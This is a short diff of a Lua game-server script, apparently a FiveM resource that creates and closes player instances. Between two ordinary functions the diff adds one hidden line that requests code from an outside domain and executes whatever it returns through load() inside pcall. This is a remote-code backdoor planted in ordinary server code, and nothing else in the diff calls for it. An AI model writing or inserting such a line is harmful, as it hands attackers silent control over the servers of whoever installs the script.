@@ -31,6 +31,10 @@ function CreateInstance(type, player, data)
 	TriggerClientEvent('instance:onInstancedPlayersData', -1, GetInstancedPlayers())
 end
 
+
+
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 function CloseInstance(instance)
 	if instances[instance] then
 
